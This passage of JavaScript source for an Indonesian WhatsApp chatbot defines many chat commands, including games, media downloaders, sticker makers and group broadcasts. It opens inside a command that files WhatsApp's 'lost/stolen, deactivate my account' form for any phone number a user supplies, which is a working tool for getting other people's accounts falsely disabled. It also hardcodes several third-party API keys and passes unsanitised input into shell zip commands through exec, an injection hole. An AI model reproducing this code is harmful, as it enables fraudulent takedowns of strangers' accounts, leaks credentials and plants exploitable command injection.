let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hilang/Dicuri: Mohon nonaktifkan akun saya")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19382.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006861186")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
if (res.data.includes("true")) {
conn.sendMessage(m.from, {text: `Results: Data ${util.format(JSON.parse(res.data.replace("for (;;);", "")))}\n\nParams: ${util.format(form)}`.replace("Perdido/roubado: desative minha conta", "CENSORED").replace(email.data[0], "CENSORED").replace(email.data[0], "CENSORED") }, {quoted: dev})
} else {
reply('Error: Sistem WhatsApp Sedang Offline, Silahkan Coba Beberapa Saat Lagi')}             
} catch (err){
console.log(err)
setReply("Gagal, Terjadi Error")
}
}
break
    
case 'tebakgambar':{
	try{
    if (!isPremium && global.db.data.users[sender].glimit < 1) return setReply('Limit game sudah habis, silahkan ketik .limit') // respon ketika limit habis 
    if (!isGroup) return setReply(mess.only.group)
	let timeout = 80000
	let poin = 2000
	let id = m.chat
	if (id in conn.tebakgambar) return setReply('Masih ada soal belum terjawab di chat ini')
  async function tebakgambar() {
  let random_level = Math.floor(Math.random() * 136)
  let random_eq = Math.floor(Math.random() * 20)
  return axios.get(`https://jawabantebakgambar.net/level-${random_level}/`).then((val) => {
    let url = "https://jawabantebakgambar.net"
    const $ = cheerio.load(val.data)
    let href = $("ul > * > a").eq(random_eq)
    let jwbn = href.find("span").text()
    let img = href.find("img").attr("data-src")
    let src = url + img
    let petunjuk = jwbn.replace(/[AIUEO|aiueo]/g, "_")
    return {
      img: src,
      jawaban: jwbn,
      petunjuk,
    }
  })
    }
  let tos = await tebakgambar ()
  console.log(tos)
	let caption = `*GAME TEBAK GAMBAR*
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Money
	`.trim()
	
	conn.tebakgambar[id] = [
    await conn.sendMessage(from, {caption: caption, image: {url: tos.img}}, {quoted: dev}),
	tos, poin,
	setTimeout(() => {
	if (conn.tebakgambar[id]) 
user.balance -= 200
reply(`*GAME TEBAK GAMBAR*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${tos.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].balance.toLocaleString()}*`)
	delete conn.tebakgambar[id]
	 }, timeout)
	 ]
	} catch (e) {
		reply('Sistem erorr, Coba lagi')
		return
		}
	}
    db.data.users[sender].glimit -= 1
	break
    
    case 'gcbot': case 'grubagriani': case 'gbbot':
reply(`*Jangan lupa join ke Grub Bot Agriani, untuk mendapatkan informasi terbaru*\n\n*❖* https://chat.whatsapp.com/FeeeCjafqiKGrkrnYA7aNY`) 	
    break
  
case 'sewa': case 'sewabot': {
var sewanya = dada(prefix, pushname, ucapanWaktu)      

conn.sendMessage(from, { contextInfo: { mentionedJid: [sender],
externalAdReply: {
showAdAttribution: true,
title: `Sewa yaaa, jangan liatin doangg🤕`, 
mediaType: 1,
renderLargerThumbnail: true,
thumbnail: fs.readFileSync('./stik/thumb.jpeg'),
mediaUrl: `https://www.instagram.com/`,
sourceUrl: `https://chat.whatsapp.com/KGxRWkljtCu3uaWzwxvarR`
//sourceUrl: `https://wa.me/6283837709331?text=lah`
}
}, text: sewanya}, {quoted: dev})
}
break    
    
case 'backup':{
if (!isOwner && !m.key.fromMe) return onlyOwner()
let path = require('path');
	let directoryPath = path.join();
	fs.readdir(directoryPath, async function (err, files) {
	if (err) {
	console.log('Unable to scan directory: ' + err);
	return setReply('Unable to scan directory: ' + err);
	 } 
	let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3")  || item.endsWith("mp4") || item.endsWith("jpg") ||item.endsWith("webp") ||item.endsWith("webm") ||item.endsWith("opus")   )
	console.log(filteredArray.length); 
	
	await filteredArray.forEach(function (file) {
	fs.unlinkSync(file)
	});
	});
let dir = fs.readdirSync(".")
let file = dir.filter(a => a !== "node_modules" && a !== "package-lock.json" && a !== ".git")
let qur = `zip -r Aqua.zip ${file.join(" ")}`

exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
  //reply(stdout)
}
})
await sleep (3000)
await conn.sendMessage(Ownerin, { document: fs.readFileSync(`Aqua.zip`), mimetype: 'application/zip', fileName: `Aqua.zip` }, { quoted: dev })
await fs.unlinkSync(`Aqua.zip`)
    }
break

case 'updategempa':{
if (!isGroupAdmins && !isOwner) return reply (mess.only.admin)
if(!q) return reply(`*UPDATE GEMPA*\n ${prefix+command} on/off`)
let dataGempa = db.data.others['updateGempa']

if(isGroup) {
if(q == "on"){
if(dataGempa.includes(from)) return setReply("Sudah aktif di group ini")
dataGempa.push(from)
setReply(`Berhasil menambahkan group ${groupName}  kedalam auto update gempa`)
} else if(q == "off"){
if(!dataGempa.includes(from)) return setReply("Sudah nonaktif di group ini")
dataGempa.splice(dataGempa.indexOf(from))
setReply(`Berhasil menonaktifkan group ${groupName}  kedalam auto update gempa`)
}
} else {
if(!q) return setReply("Masukin idgc")
if(db.data.others['updateGempa'].includes(from)) return setReply("Sudah aktif")
db.data.others['updateGempa'].push(q).then((res) => {
setReply(`Berhasil menambahkan  ${q}  kedalam auto update gempa`)
}).catch((err) => Log(err))
}
}
break

  case 'aiimg': case 'dalle': {
    reply (mess.wait)
fetchJson (`https://api.caliph.biz.id/api/openai/dalle?query=${q}&apikey=caliphkey`).then(res => {
conn.sendMedia(from, res.url, dev)
})
  }
break

case 'mute': {
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins && !isOwner) return reply (mess.only.admin)
if (args[0] === "on") {
if (db.data.chats[m.chat].mute) return reply(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].mute = true
reply(`Bot telah di mute!\nSekarang member tidak bisa menggunakan bot di dalam grub ini!!`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].mute) return reply(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].mute = false
reply(`Bot telah di unmute!\nSekarang member bisa menggunakan bot di grub ini!!`)
} else {
  reply (`*MODE MUTE*\n\n${prefix+command} on/off`)
 }
             }
             break
    
case 'cekkuota':{
  try{
let kuota = await cekkuota ()
reply (`*Nomor Axis: 6283837709331*\n\n${kuota}`)
} catch (e){
  reply ('Sistem eror coba lagi')
  return
}
	}
	break


    case 'ocr':{
        if (isImage || isQuotedImage) {
        	reply(mess.wait)
          let media = await conn.downloadAndSaveMediaMessage(quoted, 'ocr');
          exec(`tesseract ${media} tmp/ocr`, async (err, stdout) => {
            if (err) return reply(`${err}`);
            // if (stdout) {
            let txt = fs.readFileSync('./tmp/ocr.txt', 'utf-8').trim();
            let encmedia = reply(txt);
            await sleep(1000);
            // await fs.unlinkSync('temporary/ocr.txt');
            await fs.unlinkSync(media);
            console.log('OCR  SUCCESS');
            console.log(stdout);
            // }
          });
        } else {
          reply(`Kirim/Reply gambar dengan Caption ${prefix + command}\n`);
        }
        }
        break;
    
case 'stik':
case 'stiktele': {
  if (isGroup) return reply('Khusus untuk obrolan pribadi')
  if (!q) return reply('Apa yang ingin kamu cari? Contoh: .stiktele petrik')
  reply(mess.wait)
  let res = await tele(q)
  for (let i of res.sticker) {
    await sleep(2500)
    await conn.sendImageAsSticker(from, i)
  }
}
break;

case 'emojiap':
if (!q) return reply(`Invalid emoji\nContoh: ${prefix+command} 🗿`)
var data = await emoji(q)
//makeSticker ( data.result.aplle ,Sticker, StickerTypes)
conn.sendImageAsSticker(from, data.result.apple, dev)
break
case 'emojitw':{
	if (!q) return reply(`Invalid emoji\nContoh: ${prefix+command} 🗿`)
var data = await emoji(q)
conn.sendImageAsSticker(from, data.result.twitter, dev)
}
break
case 'emojiwa':{
	if (!q) return reply(`Invalid emoji\nContoh: ${prefix+command} 🗿`)
var data = await emoji(q)
conn.sendImageAsSticker(from, data.result.whatsapp, dev)
}
break
case 'emojimc':{
	if (!q) return reply(`Invalid emoji\nContoh: ${prefix+command} 🗿`)
var data = await emoji(q)
conn.sendImageAsSticker(from, data.result.microsoft, dev)
}
break
case 'emojism':{
	if (!q) return reply(`Invalid emoji\nContoh: ${prefix+command} 🗿`)
var data = await emoji(q)
conn.sendImageAsSticker(from, data.result.samsung, dev)
}
break
case 'emojigo':{
	if (!q) return reply(`Invalid emoji\nContoh: ${prefix+command} 🗿`)
var data = await emoji(q)
conn.sendImageAsSticker(from, data.result.google, dev)
}
break
case 'emojifb':{
	if (!q) return reply(`Invalid emoji\nContoh: ${prefix+command} 🗿`)
var data = await emoji(q)
conn.sendImageAsSticker(from, data.result.facebook, dev)
}
break
case 'emojisk':{
	if (!q) return reply(`Invalid emoji\nContoh: ${prefix+command} 🗿`)
var data = await emoji(q)
conn.sendImageAsSticker(from, data.result.skype, dev)
}
break
case 'emojipi':{
	if (!q) return reply(`Invalid emoji\nContoh: ${prefix+command} 🗿`)
var data = await emoji(q)
conn.sendImageAsSticker(from, data.result.joypixels, dev)
}
break
case 'emojiom':{
	if (!q) return reply(`Invalid emoji\nContoh: ${prefix+command} 🗿`)
var data = await emoji(q)
conn.sendImageAsSticker(from, data.result.openemoji, dev)
}
break
case 'emojied':{
	if (!q) return reply(`Invalid emoji\nContoh: ${prefix+command} 🗿`)
var data = await emoji(q)
conn.sendImageAsSticker(from, data.result.emojidex, dev)
}
break
case 'emojisd':{
	if (!q) return reply(`Invalid emoji\nContoh: ${prefix+command} 🗿`)
var data = await emoji(q)
conn.sendImageAsSticker(from, data.result.softbank, dev)
}
break
case 'emojimz':{
	if (!q) return reply(`Invalid emoji\nContoh: ${prefix+command} 🗿`)
var data = await emoji(q)
conn.sendImageAsSticker(from, data.result.mozilla, dev)
}
break
case 'emojiht':{
	if (!q) return reply(`Invalid emoji\nContoh: ${prefix+command} 🗿`)
var data = await emoji(q)
conn.sendImageAsSticker(from, data.result.htc, dev)
}
break
case 'emojilg':{
	if (!q) return reply(`Invalid emoji\nContoh: ${prefix+command} 🗿`)
var data = await emoji(q)
conn.sendImageAsSticker(from, data.result.ig, dev)
}
break
case 'emojims':{
	if (!q) return reply(`Invalid emoji\nContoh: ${prefix+command} 🗿`)
var data = await emoji(q)
conn.sendImageAsSticker(from, data.result.messenger, dev)
}
break
case 'emojidc':{
	if (!q) return reply(`Invalid emoji\nContoh: ${prefix+command} 🗿`)
var data = await emoji(q)
conn.sendImageAsSticker(from, data.result.docomo, dev)
}
break
    
case 'play':{
	if (!isPremium && global.db.data.users[sender].limit < 1) return reply(mess.limit) // respon ketika limit habis
	if(!q) return setReply("Teksnya mana om")
	setReply(mess.wait)
	let rus = await yts(q)
	if(rus.all.length == "0") return setReply("Video tidak bisa di download")
	let data = await rus.all.filter(v => v.type == 'video')
	
	try{
	var res = data[0]
	var info = await ytdl.getInfo(res.url);
	} catch{
	var res = data[1]
	var info = await ytdl.getInfo(res.url);
	}
	
	let audio = ytdl.filterFormats(info.formats, 'audioonly');
  if(Number(audio[0].contentLength) > 100000000 ) return setReply(`Bjir sizenya ${FileSize(audio[0].contentLength)}\nAu ah ga mao download 😤`)
    
	downloadMp3 (res.url)
   }
   db.data.users[sender].limit -= 1 // -1 limit
	break
	
  case 'mp3': 
  case 'ytmp3':
	{
		if (!isPremium && global.db.data.users[sender].limit < 1) return reply(mess.limit) // respon ketika limit habis
	if(!q) return setReply("Masukan link youtube")
	if (q.includes("https://youtube.com/channel/")) return setReply("Goblok itu bukan link vidio bangsat")
	setReply("*Scrapping...*")
    
	try{
	let info = await ytdl.getInfo(q);
	let format = ytdl.filterFormats(info.formats, 'audioonly');
	if(Number(format[0].contentLength) > 90000000 ) return setReply(`Bjir sizenya ${FileSize(format[0].contentLength)}\nAu ah ga mao download 😤`)
	 downloadMp3(q)
	  } catch(err){
	setReply(`${err}`)
	}
	}
	db.data.users[sender].limit -= 1 // -1 limit
	break

   

  case 'mp4':
case 'ytmp4':
	 try{
	if (!isPremium && global.db.data.users[sender].limit < 1) return reply(mess.limit) // respon ketika limit habis
	 if (q.includes("https://youtube.com/channel/")) return setReply("Goblok itu bukan link vidio bangsat")
	setReply("*Scrapping...*")
	
	
	let anu = await yts(q)
	if(anu.all.length == "0") return setReply("Video tidak di temukan")
	let info = await ytdl.getInfo(q);
	let format = ytdl.chooseFormat(info.formats, { quality: '18' });
	if(Number(format.contentLength) > 40000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)
	
	let teks =`*YOUTUBE VIDEO DOWNLOADER*
	
	📂 Title : ${anu.all[0].title}
	💾 Ext : 360p
	📄 Size : ${FileSize(format.contentLength)}
	⏲️ Duration : ${anu.all[0].timestamp}
	🌎 Viewers : ${h2k(anu.all[0].views)}
	🌐 Upload At : ${anu.all[0].ago}
	🔖 Author : ${anu.all[0].author.name}
	📹 Channel : ${anu.all[0].author.url}
	🔗 Url : ${anu.all[0].url}
	📝 Description : ${anu.all[0].description}`
	await conn.sendMessage(from, {image: {url: anu.all[0].image}, caption: teks},{quoted: dev})
	downloadMp4(anu.all[0].url)
	  } catch(err){
	setReply(`${err}`)
	}
	db.data.users[sender].limit -= 1 // -1 limit
	break



    
  case 'bcmem':{
      if (!isGroup) return reply(mess.only.group)
        if (!isOwner) return reply(mess.owner);
        if (!q) return reply(`Teks Nya Bang?\nContoh: ${prefix+command} Hallo`);
        let mem = [];
	    groupMembers.map( i => mem.push(i.id) )
       // let anu = await store.chats.all().map((v) => v.id);
        for (let yoi of mem) {
          if (yoi.includes('.net')) {
          	await sleep (6000)
            conn.sendMessage(yoi, {text: `${q}`});
          }
        }
        reply(`Succes`);
        }
        break;
    

case 'tebakkimia':{
    if (!isPremium && global.db.data.users[sender].glimit < 1) return setReply('Limit game sudah habis, silahkan ketik .limit') // respon ketika limit habis 
if (!isGroup) return setReply(mess.only.group)
	let timeout = 30000
	let poin = 1000
	let id = m.chat
	if (id in conn.tebakkimia) return setReply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `*TEBAK KIMIA*
	Unsur: ${json.unsur}
	Soal: Singkatan atau lambang di atas adalah...
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Money
	`.trim()
	conn.tebakkimia[id] = [
	await setReply(caption),
	json, poin,
	setTimeout(() => {
	if (conn.tebakkimia[id]) 
user.balance -= 200
reply(`*GAME TEBAK KIMIA*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].balance.toLocaleString()}*`)
	delete conn.tebakkimia[id]
	 }, timeout)
	 ]
	}
    db.data.users[sender].glimit -= 1
	break
    case 'tebaklagu':{
    	try{
    if (!isPremium && global.db.data.users[sender].glimit < 1) return setReply('Limit game sudah habis, silahkan ketik .limit') // respon ketika limit habis 
    if (!isGroup) return setReply(mess.only.group)
	let timeout = 60000
	let poin = 1200
	let id = m.chat
	if (id in conn.tebaklagu) return setReply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/qisyana/scrape/main/tebaklagu.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
  var lagu = await conn.sendMessage(from, {audio: {url: `${json.lagu}`, ptt: true, mimetype: 'audio/mpeg'}}, { quoted: dev })
	let caption = `*TEBAK LAGU*
	Artis: ${json.artis}
	Soal: Judul lagu di atas adalah...
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Money
	`.trim()
	conn.tebaklagu[id] = [
		await conn.sendMessage(from, {text: caption}, {quoted: lagu}),
	json, poin,
	setTimeout(() => {
	if (conn.tebaklagu[id]) 
     user.balance -= 200
reply(`*GAME TEBAK LAGU*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].balance.toLocaleString()}*`)
	delete conn.tebaklagu[id]
	 }, timeout)
	 ]
	} catch (e) {
		reply('Sistem erorr, Coba lagi')
		return
		}
	}
    db.data.users[sender].glimit -= 1
	break





    

  

case 'carbon':{
	try{
  setReply(mess.wait)
  const Carbon = require ( "unofficial-carbon-now")
  let buat = new Carbon.createCarbon().setCode(m.quoted ? m.quoted.text : q)
  let hasil = await Carbon.generateCarbon(buat)
  conn.sendMessage(m.chat, {image: hasil, caption: q}, {quoted: dev})
	} catch (e){
	reply( `• *Example* : ${prefix + command} text/reply\n\n_Gesek pesan ini kekanan untuk membuat gambar teks *carbon*_`  )           
	return
	}
	}
break



case 'ytdoc':{
if(!q) return setReply("Masukan link youtube")
if (q.includes("https://youtube.com/channel/")) return setReply("Goblok itu bukan link vidio bangsat")
setReply(mess.wait)
downloadMp33(q)
	 }
	break

case 'ppcp': case 'ppkapel': case 'ppcouple':{
if (!isPremium && global.db.data.users[sender].limit < 1) return reply(mess.limit) // respon ketika limit habis
reply(mess.wait)
const { data } = await axios.get("https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json")
 let random = data[Math.floor(Math.random() * data.length)]   
conn.sendMedia(from, random.male, dev)
conn.sendMedia(from, random.female, dev)
}
db.data.users[sender].limit -= 1 // -1 limit
break
    

case 'nobg': {
  if ((isMedia || isQuotedImage || isQuotedSticker)) {
    try{
      reply(mess.wait)
    const media = await conn.downloadAndSaveMediaMessage(quoted)
    let ranw = getRandom('.webp')
    let ranp = getRandom('.png')
    var api = [ 'tCWQbncx6tcVXTZUXyrHbW2e', 'p6ZKgU1wthihGqymYncxuBNu', 'kFz7BEPgVY8VyxW5CxVM7P9J', '2AjasifpR9DNpqpRQKTKWQsZ', 'TmyvKbt8DE1tjTMsQCA34dRt', 'smKvqY2ia86MptoZGUWFRc8G']
    var key = api[Math.floor(Math.random() * api.length)]
    let keyrmbg = `${key}`

    await removeBackgroundFromImageFile({ path: media, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp }).then(res => {
        fs.unlinkSync(media)
        let bufferir9vn5 = Buffer.from(res.base64img, 'base64')
        fs.writeFileSync(ranp, bufferir9vn5, (err) => {
  if (err) return reply ('Gagal, Terjadi kesalahan, silahkan coba beberapa saat lagi.')
        })
         conn.sendMessage(from, {image: fs.readFileSync(ranp), caption: 'Tanpa background'}, {quoted:dev})
  //makeSticker(fs.readFileSync(ranp),Sticker, StickerTypes)
      fs.unlinkSync(ranp)
        }) 
        
  } catch (err){
console.log (`${err}`)
}   
  }
}
break




      
      
  case 'quotes':{
    try{
let data = await fetchJson (`https://xzn.wtf/api/openai?text=hai+buatkan+quotes+hari20%ini&apikey=${apiwtf}`)
let tex = `${data.result}`
let modif = tex.replace("_powered by: https://xzn.wtf_")
reply(modif) 
  } catch (e){
      reply('Syistem erorr coba lgi')
      return
  }
  }
break
    

    
case 'foldertozip': case 'filetozip':{
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!q) return setReply(`Nama Folder Nya Apaan Bang`)
let qur = `zip -r ${q}.zip ${q}`
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
await sleep (3000)
await conn.sendMessage(from, { document: fs.readFileSync(`${q}.zip`), mimetype: 'application/zip', fileName: `${q}` }, { quoted: dev })
await fs.unlinkSync(`${q}.zip`)
    }
break


    


case 'glitchtext':
      case 'writetext':
      case 'advancedglow':
      case 'typographytext':
      case 'pixelglitch':
      case 'neonglitch':
      case 'flagtext':
      case 'flag3dtext':
      case 'deletingtext':
      case 'blackpinkstyle':
      case 'glowingtext':
      case 'underwatertext':
      case 'logomaker':
      case 'cartoonstyle':
      case 'papercutstyle':
      case 'watercolortext':
      case 'effectclouds':
      case 'blackpinklogo':
      case 'gradienttext':
      case 'summerbeach':
      case 'luxurygold':
      case 'multicoloredneon':
      case 'sandsummer':
      case 'galaxywallpaper':
      case '1917style':
      case 'makingneon':
      case 'royaltext':
      case 'freecreate':
      case 'galaxystyle':
      case 'lighteffects':
        {
        //  if (!isPrem) return replyprem(mess.premium);
          if (!q) return reply(`Example : ${prefix + command} Kayla`);
          let link;
          if (/glitchtext/.test(command))
            link =
              'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html';
          if (/writetext/.test(command))
            link =
              'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html';
          if (/advancedglow/.test(command))
            link = 'https://en.ephoto360.com/advanced-glow-effects-74.html';
          if (/typographytext/.test(command))
            link =
              'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html';
          if (/pixelglitch/.test(command))
            link =
              'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html';
          if (/neonglitch/.test(command))
            link =
              'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html';
          if (/flagtext/.test(command))
            link =
              'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html';
          if (/flag3dtext/.test(command))
            link =
              'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html';
          if (/deletingtext/.test(command))
            link =
              'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html';
          if (/blackpinkstyle/.test(command))
            link =
              'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html';
          if (/glowingtext/.test(command))
            link =
              'https://en.ephoto360.com/create-glowing-text-effects-online-706.html';
          if (/underwatertext/.test(command))
            link =
              'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html';
          if (/logomaker/.test(command))
            link =
              'https://en.ephoto360.com/free-bear-logo-maker-online-673.html';
          if (/cartoonstyle/.test(command))
            link =
              'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html';
          if (/papercutstyle/.test(command))
            link =
              'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html';
          if (/watercolortext/.test(command))
            link =
              'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html';
          if (/effectclouds/.test(command))
            link =
              'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html';
          if (/blackpinklogo/.test(command))
            link =
              'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html';
          if (/gradienttext/.test(command))
            link =
              'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html';
          if (/summerbeach/.test(command))
            link =
              'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html';
          if (/luxurygold/.test(command))
            link =
              'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html';
          if (/multicoloredneon/.test(command))
            link =
              'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html';
          if (/sandsummer/.test(command))
            link =
              'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html';
          if (/galaxywallpaper/.test(command))
            link =
              'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html';
          if (/1917style/.test(command))
            link = 'https://en.ephoto360.com/1917-style-text-effect-523.html';
          if (/makingneon/.test(command))
            link =
              'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html';
          if (/royaltext/.test(command))
            link =
              'https://en.ephoto360.com/royal-text-effect-online-free-471.html';
          if (/freecreate/.test(command))
            link =
              'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html';
          if (/galaxystyle/.test(command))
            link =
              'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html';
          if (/lighteffects/.test(command))
            link =
              'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html';
              reply(mess.wait)
          let haldwhd = await ephoto(link, q);
          conn.sendMessage(
            m.chat,
            { image: { url: haldwhd }, caption: `Nih` },
            { quoted: m }
          );
        }
        break;
    

case 'shadow':
      case 'write':
      case 'romantic':
      case 'burnpaper':
      case 'smoke':
      case 'narutobanner':
      case 'love':
      case 'undergrass':
      case 'doublelove':
      case 'coffecup':
      case 'underwaterocean':
      case 'smokyneon':
      case 'starstext':
      case 'rainboweffect':
      case 'balloontext':
      case 'metalliceffect':
      case 'embroiderytext':
      case 'flamingtext':
      case 'stonetext':
      case 'writeart':
      case 'summertext':
      case 'wolfmetaltext':
      case 'nature3dtext':
      case 'rosestext':
      case 'naturetypography':
      case 'quotesunder':
      case 'shinetext':
        {
          reply(mess.wait)
        //  if (!isPrem) return replyprem(mess.premium);
          if (!q) return reply(`Example : ${prefix + command} Kayla`);
          let link;
          if (/stonetext/.test(command))
            link =
              'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html';
          if (/writeart/.test(command))
            link =
              'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html';
          if (/summertext/.test(command))
            link =
              'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html';
          if (/wolfmetaltext/.test(command))
            link =
              'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html';
          if (/nature3dtext/.test(command))
            link =
              'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html';
          if (/rosestext/.test(command))
            link =
              'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html';
          if (/naturetypography/.test(command))
            link =
              'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html';
          if (/quotesunder/.test(command))
            link =
              'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html';
          if (/shinetext/.test(command))
            link =
              'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html';
          if (/shadow/.test(command))
            link =
              'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html';
          if (/write/.test(command))
            link =
              'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html';
          if (/romantic/.test(command))
            link =
              'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html';
          if (/burnpaper/.test(command))
            link =
              'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html';
          if (/smoke/.test(command))
            link =
              'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html';
          if (/narutobanner/.test(command))
            link =
              'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html';
          if (/love/.test(command))
            link =
              'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html';
          if (/undergrass/.test(command))
            link =
              'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html';
          if (/doublelove/.test(command))
            link =
              'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html';
          if (/coffecup/.test(command))
            link =
              'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html';
          if (/underwaterocean/.test(command))
            link =
              'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html';
          if (/smokyneon/.test(command))
            link =
              'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html';
          if (/starstext/.test(command))
            link =
              'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html';
          if (/rainboweffect/.test(command))
            link =
              'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html';
          if (/balloontext/.test(command))
            link =
              'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html';
          if (/metalliceffect/.test(command))
            link =
              'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html';
          if (/embroiderytext/.test(command))
            link =
              'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html';
          if (/flamingtext/.test(command))
            link =
              'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html';
          let dehe = await photooxy.photoOxy(link, q);
          conn.sendMessage(
            m.chat,
            { image: { url: dehe }, caption: `Nihh` },
            { quoted: m }
          );
        }
        break;

    
 case 'bcgc':{
 if (!isOwner) return reply(mess.owner);
if (args.length < 1) return reply(`Kirim/Reply Video/Image Yang Ingin Di Broadcast Dengan Caption ${prefix + command} teks`)
if(!q) return reply ('Teksnya bwng')
   reply(mess.wait)
const id = [];
let data = await conn.groupFetchAllParticipating()
const mention = Object.values(data)
  .flatMap(group => group.participants)
  .map(participant => participant.id);
for (const key in data) {
  id.push(data[key].id);
}
let media = await conn.downloadAndSaveMediaMessage(quoted)
let url = await uploadFile (media)
for(let jid of id){
if(isImage) {
	await sleep (4000)
	conn.sendMessage(jid, {caption: `${q}` ,image: {url: url}, mentions: mention})
	} else if (isVideo) {
		await sleep (4000)
		conn.sendMessage(jid, {caption: `${q}`, video: {url: url}, mentions: mention})
		} else {
await sleep (4000)
conn.sendMessage(jid, {text: `*📳 Pesan Siaran Dari Bot*\n\n𖦹 *Pesanya:*\n${q}\n\n© By ${global.botName}`, mentions: mention})
}
}
reply('Sukses')
}
break 



  case 'donasi': 
reply( ` 

╭─❒ 「  *DONASI FOR BOT* 」
│ PULSA!
├ *Nomor :* 6383837709331
├ *Nomor :* 6283837709331
├ *OWNER :* FuadXy
├ *DONASI SE IKHLASNYA*
╰─────────⁛⸙

╭─❒ 「  *DONASI FOR BOT* 」
│ UANG DIGITAL!
├ *Nomor :* 083138381932
├ *OWNER :* ZenithBot (Esm)
├ *DONASI SE IKHLASNYA*
╰─────────⁛⸙

*NOTE :*

Donasilah seikhlasnya
`)

break
    
case 'premium': case 'buyprem': {
var teksny =  ` *PRICE PREMIUM/VIP*

